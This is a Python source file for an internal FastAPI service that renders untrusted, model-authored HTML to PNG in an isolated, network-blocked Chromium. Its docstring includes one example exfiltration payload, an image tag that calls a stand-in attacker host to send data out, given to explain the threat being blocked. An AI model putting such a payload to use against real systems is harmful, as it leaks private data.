"""The `htmlrender` sidecar: HTML + CSS in, PNG out. General-purpose, not canvas-specific.

**Why this exists as a service.** Any tool that wants rich visual output — an annotated
photo, a flowchart, a comparison table, a report card — otherwise has to either
hand-roll a rasterizer per shape or send model-authored markup to the owner's browser.
The second is the one `docs/reference/DESIGN.md` refuses: the tool-view registry is
closed and a model may not author markup, URLs, or colour that reaches the DOM.
Rendering server-side to pixels *resolves* that tension rather than dodging it — the
model gets the full expressiveness of a language it is genuinely fluent in, and the
PWA only ever receives an image. Pixels cannot execute.

**The network is off, twice.** The compose service sits on a Docker network declared
`internal: true`, so the container has no route off the box at all, and every request
the page attempts is aborted here as well. Model-authored HTML is untrusted input; a
`<img src="http://attacker/?data=...">` is the obvious exfiltration primitive and
neither layer alone is a guarantee worth betting owner data on.

**It never sees owner images.** Callers render a TRANSPARENT overlay and composite it
over the photograph themselves, back inside the domain firewall. So a health-scoped
photo never leaves the api, and the payload stays small.

Lazy-launches the browser on first call and idle-unloads it, the same shape as the
`rapidocr` sidecar, so an idle box pays only the process baseline.
"""

from __future__ import annotations

import asyncio
import base64
import os
import time

from fastapi import FastAPI, HTTPException
from playwright.async_api import Browser, async_playwright
from pydantic import BaseModel, Field

# Free the browser after this many idle seconds (0 keeps it resident once launched).
IDLE_TTL_SECONDS = int(os.environ.get("HTMLRENDER_IDLE_TTL_SECONDS", "300"))

# Bound the output so a caller can't ask for a gigapixel page.
MAX_SIDE = 4096
MAX_PIXELS = 8_000_000
MAX_HTML_BYTES = 512_000
RENDER_TIMEOUT_MS = 15_000

app = FastAPI()

_browser: Browser | None = None
_playwright = None
_last_used = 0.0
_lock = asyncio.Lock()


class RenderRequest(BaseModel):
    html: str = Field(min_length=1)
    width: int = Field(ge=1, le=MAX_SIDE)
    height: int = Field(ge=1, le=MAX_SIDE)
    # Transparent is the default because the primary caller composites over a photo
    # it must not send here.
    transparent: bool = True
    # Extra settling time for webfont-free layout/animation. Bounded; the page has no
    # network, so nothing legitimate needs to be waited on for long.
    wait_ms: int = Field(default=0, ge=0, le=3000)
    scale: float = Field(default=1.0, gt=0, le=4.0)


class RenderResponse(BaseModel):
    png_base64: str
    width: int
    height: int


async def _get_browser() -> Browser:
    global _browser, _playwright, _last_used
    async with _lock:
        if _browser is None:
            _playwright = await async_playwright().start()
            _browser = await _playwright.chromium.launch(
                args=[
                    "--no-sandbox",  # the container is the sandbox; Chromium's needs CAP_SYS_ADMIN
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-extensions",
                    "--disable-background-networking",
                    "--no-first-run",
                ]
            )
        _last_used = time.monotonic()
        return _browser


async def _idle_reaper() -> None:
    global _browser, _playwright
    if IDLE_TTL_SECONDS <= 0:
        return
    while True:
        await asyncio.sleep(30)
        async with _lock:
            idle = time.monotonic() - _last_used
            if _browser is not None and idle > IDLE_TTL_SECONDS:
                await _browser.close()
                _browser = None
                if _playwright is not None:
                    await _playwright.stop()
                    _playwright = None


@app.on_event("startup")
async def _startup() -> None:
    asyncio.create_task(_idle_reaper())


@app.get("/healthz")
async def healthz() -> dict[str, object]:
    return {"ok": True, "browser_loaded": _browser is not None}


@app.post("/render")
async def render(body: RenderRequest) -> RenderResponse:
    if len(body.html.encode("utf-8")) > MAX_HTML_BYTES:
        raise HTTPException(status_code=413, detail="html too large")
    if body.width * body.height > MAX_PIXELS:
        raise HTTPException(status_code=413, detail="requested page is too many pixels")
    browser = await _get_browser()
    context = await browser.new_context(
        viewport={"width": body.width, "height": body.height},
        device_scale_factor=body.scale,
        # No JS-visible locale/timezone leakage, and a fixed one keeps renders
        # reproducible across restarts.
        locale="en-US",
        timezone_id="UTC",
    )
    try:
        page = await context.new_page()

        async def _block(route: object) -> None:
            # The container has no egress anyway; this is the second lock, and it also
            # stops a page hanging on a request that would otherwise time out slowly.
            url = route.request.url  # type: ignore[attr-defined]
            if url.startswith(("data:", "blob:", "about:")):
                await route.continue_()  # type: ignore[attr-defined]
            else:
                await route.abort()  # type: ignore[attr-defined]

        await page.route("**/*", _block)
        await page.set_content(_document(body), wait_until="load", timeout=RENDER_TIMEOUT_MS)
        if body.wait_ms:
            await page.wait_for_timeout(body.wait_ms)
        png = await page.screenshot(
            omit_background=body.transparent, type="png", timeout=RENDER_TIMEOUT_MS
        )
    except Exception as exc:  # noqa: BLE001 - a bad page must be a 400, never a 500
        raise HTTPException(status_code=400, detail=f"render failed: {exc}") from exc
    finally:
        await context.close()
    return RenderResponse(
        png_base64=base64.b64encode(png).decode("ascii"),
        width=body.width,
        height=body.height,
    )


def _document(body: RenderRequest) -> str:
    """Wrap the caller's fragment in a page with a known baseline.

    The reset matters for the overlay case: a default 8px body margin would shift
    every absolutely-positioned annotation by 8px against coordinates the caller
    computed from the photograph."""
    ground = "transparent" if body.transparent else "#ffffff"
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><style>
  *, *::before, *::after {{ box-sizing: border-box; }}
  html, body {{ margin: 0; padding: 0; width: {body.width}px; height: {body.height}px; }}
  body {{ background: {ground}; font-family: system-ui, -apple-system, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, "Noto Sans", sans-serif; }}
</style></head><body>{body.html}</body></html>"""
